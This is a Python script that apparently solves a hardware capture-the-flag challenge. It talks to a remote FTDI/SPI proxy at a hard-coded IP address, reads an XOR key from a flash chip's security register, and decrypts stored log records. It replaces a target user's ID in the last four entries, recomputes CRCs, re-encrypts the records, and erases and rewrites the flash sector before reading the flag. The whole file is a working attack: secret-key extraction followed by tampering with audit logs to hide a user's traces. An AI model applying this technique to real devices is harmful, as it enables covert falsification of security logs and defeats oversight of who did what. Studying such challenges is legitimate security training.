#!/usr/bin/env python3
import socket
import json
import binascii
import struct
import copy
import sys
from typing import List

# =========================
# Config
# =========================
REMOTE_HOST = "94.237.57.211"   # provided remote server
REMOTE_PORT = 47222             # provided remote port
CS_PIN = 0                      # /CS on A*BUS3
USB_URL = "ftdi://ftdi:2232h/1" # kept for protocol compatibility (server may ignore)
VERBOSE = True

# Target specifics
READ = 0x03
READ_SECURITY_REGISTER = 0x48
PAGE_PROGRAM = 0x02
WRITE_ENABLE = 0x06
SECTOR_ERASE = 0x20

KEY_SIZE = 12
CRC_SIZE = 4

# We only want to modify user_id == 0x5244 (little-endian -> 0x44, 0x52 in the struct)
TARGET_USER_ID = 0x5244

# The challenge stores 16-byte log records (12-byte struct incl. padding + 4-byte CRC)
RECORD_SIZE = 16

# Challenge-provided counts/addresses
TOTAL_LOG_ENTRIES = 160              # number of actual logs in the first sector
LOG_ENTRIES_TO_UPDATE = 4            # only the last 4 need changing
FLAG_ADDRESS = [0x52, 0x52, 0x52]    # address to read flag from

# =========================
# Low-level exchange
# =========================
def exchange(hex_list: List[int], readlen: int = 0) -> List[int]:
    """
    Send a JSON command to the remote FTDI proxy and return a list of ints read back.
    """
    cmd = {
        "tool": "pyftdi",
        "cs_pin": CS_PIN,
        "url": USB_URL,
        "data_out": [hex(x) for x in hex_list],
        "readlen": readlen,
    }
    data = json.dumps(cmd).encode("utf-8")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(15)
        s.connect((REMOTE_HOST, REMOTE_PORT))
        s.sendall(data)
        buf = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if buf.endswith(b"]"):
                break
    try:
        resp = json.loads(buf.decode("utf-8"))
    except Exception as e:
        raise RuntimeError(f"Bad response from server: {buf[:200]}... ({e})")
    # ensure ints
    return [int(x) for x in resp]

# =========================
# Helpers
# =========================
def chunk(lst, n):
    return [lst[i:i+n] for i in range(0, len(lst), n)]

def xor_in_place(blocks: List[List[int]], key: List[int]):
    for b in blocks:
        for i in range(0, len(b) - CRC_SIZE):
            b[i] ^= key[i % KEY_SIZE]

def append_crc(data_bytes: bytes) -> bytes:
    crc = binascii.crc32(data_bytes) & 0xFFFFFFFF
    return data_bytes + struct.pack("<I", crc)  # little-endian to match C code

def get_key() -> List[int]:
    # Read Security Register #1 starting at offset 0x52, with 8 dummy clocks (one extra byte)
    key = exchange([READ_SECURITY_REGISTER, 0x00, 0x10, 0x52, 0x00], KEY_SIZE)
    if VERBOSE:
        print("Key:", key)
    if len(key) != KEY_SIZE:
        raise RuntimeError(f"Unexpected key length: {len(key)}")
    return key

def read_logs_first_sector() -> List[List[int]]:
    raw = exchange([READ, 0x00, 0x00, 0x00], 4096)
    records = chunk(raw, RECORD_SIZE)
    return records

def get_flag() -> str:
    data = exchange([READ] + FLAG_ADDRESS, 256)
    chars = [chr(c) for c in data if c < 255]
    return "".join(chars)

def write_pages(pages: List[List[int]]):
    """
    Program pages of 256 bytes each. `pages` is a list of 256-byte lists.
    Each page is written at address [0x00, page_no, 0x00]
    """
    for page_no, page in enumerate(pages):
        if len(page) != 256:
            raise ValueError(f"Page {page_no} has {len(page)} bytes (expected 256).")
        addr = [0x00, page_no & 0xFF, 0x00]
        packet = [PAGE_PROGRAM] + addr + page
        exchange([WRITE_ENABLE])
        exchange(packet)

def main():
    # 1) Read all logs from sector 0
    logs = read_logs_first_sector()
    # Keep only the actual log entries
    logs = logs[:TOTAL_LOG_ENTRIES]

    # 2) Read XOR key
    key = get_key()

    # 3) Make a deep copy to preserve original bytes for untouched records
    saved_logs = copy.deepcopy(logs)

    # 4) Identify the last N entries to change
    to_change = copy.deepcopy(logs[-LOG_ENTRIES_TO_UPDATE:])

    # 5) Decrypt only the entries we plan to change (and grab a sample entry to source a different user_id)
    xor_in_place(to_change, key)

    # Also decrypt one sample entry to borrow a "valid" user_id
    sample = copy.deepcopy(logs[0])
    xor_in_place([sample], key)

    # Validate CRC implementation using the sample (defensive)
    if list(append_crc(bytes(sample[:-CRC_SIZE]))) != sample:
        print("[!] Warning: CRC validation on sample failed (continuing anyway)")
    else:
        if VERBOSE: print("[*] CRC validated on sample.")

    new_uid_lo = sample[6]
    new_uid_hi = sample[7]

    # 6) Rewrite user_id for the target entries, recalc CRC, then re-encrypt
    for i, rec in enumerate(to_change):
        # Check if record matches target user id (little-endian 0x5244 => bytes [0x44, 0x52])
        if rec[6] == 0x44 and rec[7] == 0x52:
            rec[6] = new_uid_lo
            rec[7] = new_uid_hi
            # Recompute CRC over first 12 bytes
            new_bytes = append_crc(bytes(rec[:RECORD_SIZE-CRC_SIZE]))
            new_rec = list(new_bytes)
            # Re-encrypt record in place
            xor_in_place([new_rec], key)
            to_change[i] = new_rec
        else:
            # Not our target; re-encrypt original decrypted record
            new_rec = rec[:]
            xor_in_place([new_rec], key)
            to_change[i] = new_rec

    # 7) Splice modified tail back into the full set
    saved_logs[-LOG_ENTRIES_TO_UPDATE:] = to_change

    # 8) Flatten into 256-byte pages (16 records x 16 bytes)
    pages = chunk(sum(saved_logs, []), 256)
    if len(pages) * 256 != len(saved_logs) * RECORD_SIZE:
        raise RuntimeError("Page sizing mismatch.")

    # 9) Erase sector 0 and write back
    if VERBOSE: print("[*] Erasing sector 0...")
    exchange([WRITE_ENABLE])
    exchange([SECTOR_ERASE, 0x00, 0x00, 0x00])

    if VERBOSE: print("[*] Programming pages...")
    write_pages(pages)

    # 10) Read flag
    flag = get_flag()
    print("FLAG:", flag)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)
